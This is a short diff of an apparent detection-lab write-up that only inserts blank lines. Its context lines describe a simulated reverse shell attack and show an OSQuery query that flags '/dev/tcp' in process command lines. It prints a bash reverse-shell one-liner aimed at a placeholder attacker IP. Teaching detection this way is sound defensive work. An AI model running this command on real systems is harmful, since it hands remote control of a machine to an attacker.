@@ -77,6 +77,7 @@ Attacks Simulated-
 1. Reverse Shell Attack-
 A reverse shell allows the attacker to control the victim system remotely.
 Example reverse shell command used by attacker:
+
 bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
 
 Detection Focus-
@@ -84,6 +85,7 @@ Suspicious processes
 Unusual network connections
 
 OSQuery Detection Query-
+
 SELECT pid,name,cmdline 
 FROM processes
 WHERE cmdline LIKE '%/dev/tcp%';
